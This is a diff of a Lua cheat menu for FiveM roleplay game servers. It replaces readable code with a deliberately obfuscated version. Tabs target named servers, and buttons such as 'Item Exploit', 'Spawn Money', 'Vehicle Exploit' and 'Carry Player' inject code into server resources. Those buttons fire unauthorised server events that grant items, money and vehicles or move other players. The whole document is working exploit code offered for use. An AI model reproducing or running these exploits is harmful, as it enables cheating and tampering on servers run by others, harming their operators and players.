-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Add item with t1-rgbcontroller
-            MachoInjectResource("t1-rgbcontroller", string.format([[
+                ]],v726,v727));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v725==(0 + 0)) then v726=MachoMenuGetInputbox(v633);v727=tonumber(MachoMenuGetInputbox(v634)) or 1 ;v725=1180 -(216 + 963) ;end end end);end if v436:find("Owl Roleplay") then local v635=MachoMenuAddTab(v4,"Owl Roleplay");local v636=MachoMenuGroup(v635,"Owl Roleplay Item",v3,9,(v1.x-v3) + (1437 -(485 + 802)) ,v1.y);local v637=MachoMenuInputbox(v636,"Code Name","Example: item_code");local v638=MachoMenuInputbox(v636,"Code Amount","Example: 3");MachoMenuButton(v636,"Item Exploit",function() local v728=MachoMenuGetInputbox(v637);local v729=tonumber(MachoMenuGetInputbox(v638));if ( not v728 or (v728=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v729 or (v729<=(559 -(432 + 127)))) then local v848=0;while true do if (v848==(1073 -(1065 + 8))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("t1-rgbcontroller",string.format([[
                 TriggerServerEvent('t1-rgbcontroller:sv:AddItem', '%s', %d)
-            ]], itemKod, miktar))
-    
-            -- Notification: Process successful
-            MachoMenuNotification("Success", string.format("%d %s added!", miktar, itemKod))
-        end)
-
-        -- Input: Target Player ID
-        local TargetPlayerIdHandle = MachoMenuInputbox(TradeSection, "Target Player ID", "Example: 123")
-
-        -- Button: Carry Player
-        MachoMenuButton(TradeSection, "Carry Player", function()
-            local targetPlayerId = tonumber(MachoMenuGetInputbox(TargetPlayerIdHandle))
-
-            if not targetPlayerId or targetPlayerId <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid player ID!")
-                return
-            end
-
-            -- Carry player with t1-cr
-            MachoInjectResource("t1-cr", string.format([[
+            ]],v728,v729));MachoMenuNotification("Success",string.format("%d %s added!",v729,v728));end);local v639=MachoMenuInputbox(v636,"Target Player ID","Example: 123");MachoMenuButton(v636,"Carry Player",function() local v730=tonumber(MachoMenuGetInputbox(v639));if ( not v730 or (v730<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end MachoInjectResource("t1-cr",string.format([[
                 TriggerServerEvent('t1-cr:tasi-target-server', %d)
-            ]], targetPlayerId))
-
-            -- Notification: Process successful
-            MachoMenuNotification("Success", string.format("Player ID %d carried!", targetPlayerId))
-        end)
-    end
-
-    -- Light Roleplay
-    if serverName:find("Light Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Light Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Light Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Inputs: Item Name and Amount
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-
-        -- Button: Start Process
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-
-            -- Inject with random item selection
-            MachoInjectResource("ox_inventory", string.format([[
+            ]],v730));MachoMenuNotification("Success",string.format("Player ID %d carried!",v730));end);end if v436:find("Light Roleplay") then local v640=MachoMenuAddTab(v4,"Light Roleplay");local v641=MachoMenuGroup(v640,"Light Roleplay Item",v3,5 + 4 ,(v1.x-v3) + (1751 -(635 + 966)) ,v1.y);local v642=MachoMenuInputbox(v641,"Code Name","Example: item_code");local v643=MachoMenuInputbox(v641,"Code Amount","Example: 3");MachoMenuButton(v641,"Item Exploit",function() local v731=MachoMenuGetInputbox(v642);local v732=tonumber(MachoMenuGetInputbox(v643));if ( not v731 or (v731=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v732 or (v732<=(0 + 0))) then local v849=42 -(5 + 37) ;while true do if (v849==(0 -0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -7961,95 +3632,11 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-        end)
-
-        -- Yellow Pages Inputs
-        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
-        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
-        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
-        
-        -- Yellow Pages Button
-        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
-            local name = MachoMenuGetInputbox(NameInputHandle)
-            local phone = MachoMenuGetInputbox(PhoneInputHandle)
-            local message = MachoMenuGetInputbox(MessageInputHandle)
-        
-            if not name or name == "" then
-                MachoMenuNotification("Error", "Please enter a name!")
-                return
-            end
-        
-            if not phone or phone == "" then
-                MachoMenuNotification("Error", "Please enter a phone number!")
-                return
-            end
-        
-            if not message or message == "" then
-                MachoMenuNotification("Error", "Please enter a message!")
-                return
-            end
-        
-            -- Yellow Pages Post with MachoInjectResource
-            MachoInjectResource("gksphone", string.format([[
+            ]],v731,v732));end);local v644=MachoMenuInputbox(v641,"Name","Name to appear in yellow pages");local v645=MachoMenuInputbox(v641,"Phone Number","Example: 123-456-7890");local v646=MachoMenuInputbox(v641,"Message","Text to appear in yellow pages");MachoMenuButton(v641,"Send to Yellow Pages",function() local v733=0 + 0 ;local v734;local v735;local v736;while true do if (v733==3) then MachoInjectResource("gksphone",string.format([[
                 TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
-            ]], name, phone, message))
-            
-            MachoMenuNotification("Success", "Sent to yellow pages!")
-        end)
-    end
-
-    -- Aera Roleplay
-    if serverName:find("Aera Roleplay") then
-        local ValoriaTab = MachoMenuAddTab(MenuWindow, "Aera Roleplay")
-        local ValoriaSection = MachoMenuGroup(ValoriaTab, "Item Exploit", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)
-
-        -- Item code text box
-        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")
-
-        -- Amount text box
-        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")
-
-        -- Give Item button
-        MachoMenuButton(ValoriaSection, "Give Item", function()
-            local item = MachoMenuGetInputbox(InputBoxItemCode)
-            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1
-
-            if item ~= "" and amount > 0 then
-                MachoInjectResource('monitor', string.format([[ 
+            ]],v734,v735,v736));MachoMenuNotification("Success","Sent to yellow pages!");break;end if (v733==1) then v736=MachoMenuGetInputbox(v646);if ( not v734 or (v734=="")) then local v942=0 -0 ;while true do if (v942==(0 + 0)) then MachoMenuNotification("Error","Please enter a name!");return;end end end v733=3 -1 ;end if (v733==(0 -0)) then v734=MachoMenuGetInputbox(v644);v735=MachoMenuGetInputbox(v645);v733=1;end if (v733==(3 -1)) then if ( not v735 or (v735=="")) then MachoMenuNotification("Error","Please enter a phone number!");return;end if ( not v736 or (v736=="")) then MachoMenuNotification("Error","Please enter a message!");return;end v733=7 -4 ;end end end);end if v436:find("Aera Roleplay") then local v647=MachoMenuAddTab(v4,"Aera Roleplay");local v648=MachoMenuGroup(v647,"Item Exploit",v3,0,(v1.x-v3) + 108 + 42 ,679 -(318 + 211) );local v649=MachoMenuInputbox(v648,"Item Code","e.g., sandwich");local v650=MachoMenuInputbox(v648,"Amount","e.g., 3");MachoMenuButton(v648,"Give Item",function() local v737=0 -0 ;local v738;local v739;while true do if ((1587 -(963 + 624))==v737) then v738=MachoMenuGetInputbox(v649);v739=tonumber(MachoMenuGetInputbox(v650)) or (1 + 0) ;v737=1;end if (v737==(847 -(518 + 328))) then if ((v738~="") and (v739>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
                     TriggerServerEvent("jim-mining:server:toggleItem", -1, "%s", %d) 
-                ]], item, amount, item, amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
-            end
-        end)
-    end
-
-    -- Istanbul Roleplay
-    if serverName:find("Istanbul Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Istanbul Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Istanbul Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Item Exploit
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Inject with random item selection
-            MachoInjectResource("ox_inventory", string.format([[
+                ]],v738,v739,v738,v739));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);end if v436:find("Istanbul Roleplay") then local v651=MachoMenuAddTab(v4,"Istanbul Roleplay");local v652=MachoMenuGroup(v651,"Istanbul Roleplay Item",v3,13 -4 ,(v1.x-v3) + (467 -(301 + 16)) ,v1.y);local v653=MachoMenuInputbox(v652,"Code Name","Example: item_code");local v654=MachoMenuInputbox(v652,"Code Amount","Example: 3");MachoMenuButton(v652,"Item Exploit",function() local v740=0 -0 ;local v741;local v742;while true do if (v740==2) then MachoInjectResource("ox_inventory",string.format([[
                 local items = exports.ox_inventory:Items()
                 local playerItems = []
     
@@ -8072,113 +3659,15 @@ Citizen.CreateThread(function()
                 }
     
                 TriggerServerEvent("earth-illegal:server:TradeItem", tradeData.first, tradeData.second, tradeData.third)
-            ]], miktar, miktar, itemKod))
-        end)
-    
-        -- Money Exploit
-        MachoMenuText(TradeSection, "Money Exploit")
-        local PaymentTypeInputBoxHandle = MachoMenuInputbox(TradeSection, "Payment Type", "Only Cash or Bank")
-        local RefundAmountInputBoxHandle = MachoMenuInputbox(TradeSection, "Money Amount", "Example: 10000")
-    
-        MachoMenuButton(TradeSection, "Spawn Money", function()
-            local RefundData = {
-                paymentType = MachoMenuGetInputbox(PaymentTypeInputBoxHandle),
-                refund = tonumber(MachoMenuGetInputbox(RefundAmountInputBoxHandle)) or 11111,
-                playerId = GetPlayerServerId(PlayerId())
-            }
-    
-            -- Payment type validation
-            if RefundData.paymentType ~= "Cash" and RefundData.paymentType ~= "Bank" then
-                MachoMenuNotification("Error", "Payment type must be 'Cash' or 'Bank'!")
-                return
-            end
-    
-            if not RefundData.refund or RefundData.refund <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid money amount!")
-                return
-            end
-    
-            MachoInjectResource('monitor', string.format([[
+            ]],v742,v742,v741));break;end if (v740==(2 -1)) then if ( not v741 or (v741=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v742 or (v742<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end v740=2 + 0 ;end if (v740==(0 + 0)) then v741=MachoMenuGetInputbox(v653);v742=tonumber(MachoMenuGetInputbox(v654));v740=1;end end end);MachoMenuText(v652,"Money Exploit");local v655=MachoMenuInputbox(v652,"Payment Type","Only Cash or Bank");local v656=MachoMenuInputbox(v652,"Money Amount","Example: 10000");MachoMenuButton(v652,"Spawn Money",function() local v743={paymentType=MachoMenuGetInputbox(v655),refund=tonumber(MachoMenuGetInputbox(v656)) or (23721 -12610) ,playerId=GetPlayerServerId(PlayerId())};if ((v743.paymentType~="Cash") and (v743.paymentType~="Bank")) then local v850=0 + 0 ;while true do if (v850==(0 + 0)) then MachoMenuNotification("Error","Payment type must be 'Cash' or 'Bank'!");return;end end end if ( not v743.refund or (v743.refund<=(0 -0))) then local v851=0 + 0 ;while true do if (v851==(1019 -(829 + 190))) then MachoMenuNotification("Error","Please enter a valid money amount!");return;end end end MachoInjectResource("monitor",string.format([[
                 TriggerServerEvent('CL-PoliceGarageV2:RefundRent', "%s", %d, %d, "policejob")
-            ]], RefundData.paymentType, RefundData.refund, RefundData.playerId))
-    
-            MachoMenuNotification("Success", "Money exploit sent! Amount: " .. RefundData.refund)
-        end)
-    
-        -- Vehicle Data Exploit
-        MachoMenuText(TradeSection, "Vehicle Data Exploit")
-        local InputBoxVehicleName = MachoMenuInputbox(TradeSection, "Vehicle Name", "Example: sultan")
-    
-        MachoMenuButton(TradeSection, "Send Vehicle", function()
-            local vehicleName = MachoMenuGetInputbox(InputBoxVehicleName)
-    
-            if not vehicleName or vehicleName == "" then
-                MachoMenuNotification("Error", "Vehicle name cannot be empty!")
-                return
-            end
-    
-            MachoInjectResource('CL-PoliceGarage', string.format([[
+            ]],v743.paymentType,v743.refund,v743.playerId));MachoMenuNotification("Success","Money exploit sent! Amount: "   .. v743.refund );end);MachoMenuText(v652,"Vehicle Data Exploit");local v657=MachoMenuInputbox(v652,"Vehicle Name","Example: sultan");MachoMenuButton(v652,"Send Vehicle",function() local v744=MachoMenuGetInputbox(v657);if ( not v744 or (v744=="")) then local v852=0 -0 ;while true do if (v852==0) then MachoMenuNotification("Error","Vehicle name cannot be empty!");return;end end end MachoInjectResource("CL-PoliceGarage",string.format([[
                 TriggerServerEvent("CL-PoliceGarage:TakeMoney", "cash", 0, "%s", "%s")
-            ]], vehicleName, vehicleName, vehicleName))
-    
-            MachoMenuNotification("Success", "Vehicle exploit sent! Vehicle: " .. vehicleName)
-        end)
-    
-        -- Vehicle Data V2
-        MachoMenuText(TradeSection, "Vehicle Data V2")
-        local InputBoxVehicleNameV2 = MachoMenuInputbox(TradeSection, "Vehicle Code", "Example: adder")
-    
-        MachoMenuButton(TradeSection, "Send Vehicle V2", function()
-            local vehicleNameV2 = MachoMenuGetInputbox(InputBoxVehicleNameV2)
-    
-            if not vehicleNameV2 or vehicleNameV2 == "" then
-                MachoMenuNotification("Error", "Vehicle code cannot be empty!")
-                return
-            end
-    
-            MachoInjectResource('pa-vehicleshop', string.format([[
+            ]],v744,v744,v744));MachoMenuNotification("Success","Vehicle exploit sent! Vehicle: "   .. v744 );end);MachoMenuText(v652,"Vehicle Data V2");local v658=MachoMenuInputbox(v652,"Vehicle Code","Example: adder");MachoMenuButton(v652,"Send Vehicle V2",function() local v745=0;local v746;while true do if (v745==0) then v746=MachoMenuGetInputbox(v658);if ( not v746 or (v746=="")) then MachoMenuNotification("Error","Vehicle code cannot be empty!");return;end v745=1;end if (1==v745) then MachoInjectResource("pa-vehicleshop",string.format([[
                 TriggerServerEvent('pa-vehicleshop:buyVehicle:server', "bank", "%s", 1, 1, nil, "cardealer")
-            ]], vehicleNameV2, vehicleNameV2))
-    
-            MachoMenuNotification("Success", "Vehicle V2 exploit sent! Vehicle: " .. vehicleNameV2)
-        end)
-    
-        -- All Bring
-        MachoMenuText(TradeSection, "All Bring")
-        MachoMenuButton(TradeSection, "All Bring", function()
-            MachoInjectResource('monitor', [[
+            ]],v746,v746));MachoMenuNotification("Success","Vehicle V2 exploit sent! Vehicle: "   .. v746 );break;end end end);MachoMenuText(v652,"All Bring");MachoMenuButton(v652,"All Bring",function() MachoInjectResource("monitor",[[
                 TriggerServerEvent('ServerValidEmote', '-1', 'dog', 'dog', 1405553601)
-            ]])
-    
-            MachoMenuNotification("Success", "All Bring exploit sent!")
-        end)
-    end
-
-    -- Ria Roleplay
-    if serverName:find("Ria Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Ria Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Ria Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Item Exploit
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Random item selection from ox_inventory and data structure
-            MachoInjectResource("ox_inventory", string.format([[
+            ]]);MachoMenuNotification("Success","All Bring exploit sent!");end);end if v436:find("Ria Roleplay") then local v659=0;local v660;local v661;local v662;local v663;local v664;local v665;local v666;while true do if (4==v659) then MachoMenuButton(v661,"Send to Yellow Pages",function() local v910=MachoMenuGetInputbox(v664);local v911=MachoMenuGetInputbox(v665);local v912=MachoMenuGetInputbox(v666);if ( not v910 or (v910=="")) then MachoMenuNotification("Error","Please enter a name!");return;end if ( not v911 or (v911=="")) then MachoMenuNotification("Error","Please enter a phone number!");return;end if ( not v912 or (v912=="")) then local v943=0 -0 ;while true do if (v943==(0 -0)) then MachoMenuNotification("Error","Please enter a message!");return;end end end TriggerServerEvent("gksphone:yellow_postPagess",v910,v911,v912,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");end);break;end if (v659==(4 -2)) then MachoMenuButton(v661,"Item Exploit",function() local v913=MachoMenuGetInputbox(v662);local v914=tonumber(MachoMenuGetInputbox(v663));if ( not v913 or (v913=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v914 or (v914<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -8225,67 +3714,7 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-        end)
-
-        -- Yellow Pages Inputs
-        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
-        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
-        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
-    
-        -- Yellow Pages Button
-        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
-            local name = MachoMenuGetInputbox(NameInputHandle)
-            local phone = MachoMenuGetInputbox(PhoneInputHandle)
-            local message = MachoMenuGetInputbox(MessageInputHandle)
-    
-            if not name or name == "" then
-                MachoMenuNotification("Error", "Please enter a name!")
-                return
-            end
-    
-            if not phone or phone == "" then
-                MachoMenuNotification("Error", "Please enter a phone number!")
-                return
-            end
-    
-            if not message or message == "" then
-                MachoMenuNotification("Error", "Please enter a message!")
-                return
-            end
-    
-            -- Yellow Pages Post
-            TriggerServerEvent('gksphone:yellow_postPagess', name, phone, message, "", "bartender")
-            MachoMenuNotification("Success", "Sent to yellow pages!")
-        end)
-    end
-
-    -- Gonna Roleplay
-    if serverName:find("Gonna Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Gonna Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Gonna Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Inputs: Item Name and Amount
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-
-        -- Button: Start Process
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-
-            -- Inject with random item selection
-            MachoInjectResource("ox_inventory", string.format([[
+            ]],v913,v914));end);v664=MachoMenuInputbox(v661,"Name","Name to appear in yellow pages");v659=3;end if (v659==(1 + 2)) then v665=MachoMenuInputbox(v661,"Phone Number","Example: 123-456-7890");v666=MachoMenuInputbox(v661,"Message","Text to appear in yellow pages");v659=12 -8 ;end if ((0 + 0)==v659) then v660=MachoMenuAddTab(v4,"Ria Roleplay");v661=MachoMenuGroup(v660,"Ria Roleplay Item",v3,622 -(520 + 93) ,(v1.x-v3) + (426 -(259 + 17)) ,v1.y);v659=1 + 0 ;end if ((1 + 0)==v659) then v662=MachoMenuInputbox(v661,"Code Name","Example: item_code");v663=MachoMenuInputbox(v661,"Code Amount","Example: 3");v659=6 -4 ;end end end if v436:find("Gonna Roleplay") then local v667=591 -(396 + 195) ;local v668;local v669;local v670;local v671;while true do if (1==v667) then v670=MachoMenuInputbox(v669,"Code Name","Example: item_code");v671=MachoMenuInputbox(v669,"Code Amount","Example: 3");v667=5 -3 ;end if (v667==(1763 -(440 + 1321))) then MachoMenuButton(v669,"Item Exploit",function() local v915=MachoMenuGetInputbox(v670);local v916=tonumber(MachoMenuGetInputbox(v671));if ( not v915 or (v915=="")) then local v944=0;while true do if (v944==(1829 -(1059 + 770))) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v916 or (v916<=0)) then local v945=0 -0 ;while true do if (v945==(545 -(424 + 121))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                 local items = exports.ox_inventory:Items()
                 local playerItems = {}
 
@@ -8307,35 +3736,7 @@ Citizen.CreateThread(function()
                     json.decode(string.format('{"amount":{"max":%d,"min":%d},"name":"%s"}', %d, %d, "%s")), 
                     json.decode('null')
                 )
-            ]], miktar, miktar, itemKod, miktar, miktar, itemKod))
-        end)
-    end
-
-    -- Royal Roleplay
-    if serverName:find("Royal Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Royal Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Royal Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Item Exploit
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Random item selection from ox_inventory and data structure
-            MachoInjectResource("ox_inventory", string.format([[
+            ]],v916,v916,v915,v916,v916,v915));end);break;end if (v667==(0 + 0)) then v668=MachoMenuAddTab(v4,"Gonna Roleplay");v669=MachoMenuGroup(v668,"Gonna Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);v667=1;end end end if v436:find("Royal Roleplay") then local v672=MachoMenuAddTab(v4,"Royal Roleplay");local v673=MachoMenuGroup(v672,"Royal Roleplay Item",v3,9,(v1.x-v3) + (1497 -(641 + 706)) ,v1.y);local v674=MachoMenuInputbox(v673,"Code Name","Example: item_code");local v675=MachoMenuInputbox(v673,"Code Amount","Example: 3");MachoMenuButton(v673,"Item Exploit",function() local v747=0 + 0 ;local v748;local v749;while true do if (v747==(442 -(249 + 191))) then MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -8382,28 +3783,7 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-        end)
-    end
-
-    -- Rac10 Exploits
-    if serverName:find("Rac10") then
-        local ExploitMenuTab = MachoMenuAddTab(MenuWindow, "Rac10 Exploits")
-        local ExploitSection = MachoMenuGroup(ExploitMenuTab, "Rac10 Exploits", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-        
-        -- 1. VEHICLE EXPLOIT
-        MachoMenuText(ExploitSection, "Vehicle Exploit")
-        local VehicleModelInputBoxHandle = MachoMenuInputbox(ExploitSection, "Vehicle Model", "e.g., hakuchou")
-        local VehiclePlateInputBoxHandle = MachoMenuInputbox(ExploitSection, "Plate", "e.g., 34AKP952")
-        
-        MachoMenuButton(ExploitSection, "Spawn Vehicle", function()
-            local VehicleData = {
-                model = MachoMenuGetInputbox(VehicleModelInputBoxHandle) or "hakuchou",
-                plate = MachoMenuGetInputbox(VehiclePlateInputBoxHandle) or "34AKP952"
-            }
-        
-            if VehicleData.model and VehicleData.model ~= "" and VehicleData.plate and VehicleData.plate ~= "" then
-                MachoInjectResource('monitor', string.format([[ 
+            ]],v748,v749));break;end if (v747==(0 -0)) then v748=MachoMenuGetInputbox(v674);v749=tonumber(MachoMenuGetInputbox(v675));v747=1 + 0 ;end if (v747==(3 -2)) then if ( not v748 or (v748=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v749 or (v749<=0)) then local v946=0;while true do if (v946==0) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v747=429 -(183 + 244) ;end end end);end if v436:find("Rac10") then local v676=MachoMenuAddTab(v4,"Rac10 Exploits");local v677=MachoMenuGroup(v676,"Rac10 Exploits",v3,1 + 8 ,(v1.x-v3) + (880 -(434 + 296)) ,v1.y);MachoMenuText(v677,"Vehicle Exploit");local v678=MachoMenuInputbox(v677,"Vehicle Model","e.g., hakuchou");local v679=MachoMenuInputbox(v677,"Plate","e.g., 34AKP952");MachoMenuButton(v677,"Spawn Vehicle",function() local v750={model=MachoMenuGetInputbox(v678) or "hakuchou" ,plate=MachoMenuGetInputbox(v679) or "34AKP952" };if (v750.model and (v750.model~="") and v750.plate and (v750.plate~="")) then local v853=0 -0 ;while true do if (v853==(512 -(169 + 343))) then MachoInjectResource("monitor",string.format([[ 
                     local model = "%s"
                     local plate = "%s"
                     local playerPed = PlayerPedId()
@@ -8418,103 +3798,14 @@ Citizen.CreateThread(function()
                         Citizen.Wait(500)
                         TriggerEvent("bb_admin:client:SaveCar")
                     end, spawnLoc, true)
-                ]], VehicleData.model, VehicleData.plate))
-                MachoMenuNotification("Success", "Vehicle spawned!")
-            else
-                MachoMenuNotification("Error", "Please enter a valid vehicle model and plate!")
-            end
-        end)
-        
-        -- 2. MONEY EXPLOIT
-        MachoMenuText(ExploitSection, "Money Exploit")
-        local MoneyAmountInputBoxHandle = MachoMenuInputbox(ExploitSection, "Money Amount", "e.g., 100000")
-        
-        MachoMenuButton(ExploitSection, "Spawn Money", function()
-            local MoneyData = {
-                amount = tonumber(MachoMenuGetInputbox(MoneyAmountInputBoxHandle)) or 100000
-            }
-        
-            if MoneyData.amount > 0 then
-                MachoInjectResource('qb-taxijob', string.format([[ 
+                ]],v750.model,v750.plate));MachoMenuNotification("Success","Vehicle spawned!");break;end end else MachoMenuNotification("Error","Please enter a valid vehicle model and plate!");end end);MachoMenuText(v677,"Money Exploit");local v680=MachoMenuInputbox(v677,"Money Amount","e.g., 100000");MachoMenuButton(v677,"Spawn Money",function() local v751={amount=tonumber(MachoMenuGetInputbox(v680)) or 100000 };if (v751.amount>(0 + 0)) then MachoInjectResource("qb-taxijob",string.format([[ 
                     TriggerServerEvent('qb-taxi:server:NpcPay', %d)
-                ]], MoneyData.amount))
-                MachoMenuNotification("Success", "Money exploit executed!")
-            else
-                MachoMenuNotification("Error", "Please enter a valid money amount!")
-            end
-        end)
-        
-        -- 3. ITEM EXPLOIT
-        MachoMenuText(ExploitSection, "Item Exploit")
-        local ItemCodeInputBoxHandle = MachoMenuInputbox(ExploitSection, "Item Code", "e.g., weapon_pistol")
-    
-        MachoMenuButton(ExploitSection, "Give Item", function()
-            local itemCode = MachoMenuGetInputbox(ItemCodeInputBoxHandle) or "weapon_pistol"
-    
-            if itemCode ~= "" then
-                MachoInjectResource('monitor', string.format([[ 
+                ]],v751.amount));MachoMenuNotification("Success","Money exploit executed!");else MachoMenuNotification("Error","Please enter a valid money amount!");end end);MachoMenuText(v677,"Item Exploit");local v681=MachoMenuInputbox(v677,"Item Code","e.g., weapon_pistol");MachoMenuButton(v677,"Give Item",function() local v752=0 -0 ;local v753;while true do if (v752==0) then v753=MachoMenuGetInputbox(v681) or "weapon_pistol" ;if (v753~="") then MachoInjectResource("monitor",string.format([[ 
                     QBCore.Functions.TriggerCallback('bz:itemsver', function(item)
                     end, '%s')
-                ]], itemCode))
-                MachoMenuNotification("Success", "Item exploit executed!")
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code!")
-            end
-        end)
-    end
-
-    -- Xen Roleplay
-    if serverName:find("Xen Roleplay") then
-        local ItemExploitTab = MachoMenuAddTab(MenuWindow, "Xen Roleplay")
